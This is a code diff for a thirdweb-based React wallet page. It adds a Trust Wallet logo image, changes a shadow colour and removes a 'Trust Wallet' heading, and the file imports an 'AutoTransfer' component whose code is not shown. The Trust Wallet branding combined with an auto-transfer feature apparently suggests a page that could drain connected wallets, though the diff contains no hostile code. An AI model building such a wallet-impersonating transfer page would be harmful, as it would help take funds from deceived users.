@@ -7,6 +7,7 @@ import { createWallet, type Wallet } from "thirdweb/wallets";
 import AutoTransfer from "./components/AutoTransfer";
 import thirdwebIcon from "@public/thirdweb.svg";
 import trustwallet from "@public/trustwallet.png";
+import trust from "@public/trust.png";
 // --- Création du client Thirdweb ---
 const client = createThirdwebClient({
   clientId: "c98a5d48ad89f114ad6044933fced541",
@@ -64,14 +65,17 @@ function Header() {
         alt="Thirdweb Logo"
         width={150}
         height={150}
-        style={{ filter: "drop-shadow(0px 0px 24px #a726a9a8)" }}
+        style={{ filter: "drop-shadow(0px 0px 24px #2826a9a8)" }}
+      />
+      <Image
+        src={trust}
+        alt="Thirdweb Logo"
+        width={150}
+        height={150}
+        style={{ filter: "drop-shadow(0px 0px 24px #2826a9a8)" }}
       />
 
-      <h1 className="text-2xl md:text-6xl font-semibold md:font-bold tracking-tighter mt-6 text-zinc-900">
-        Trust
-        {/* <span className="text-zinc-500 inline-block mx-1"> + </span> */}
-        <span className="inline-block -skew-x-6 text-blue-500">Wallet</span>
-      </h1>
+    
     </header>
   );
 }
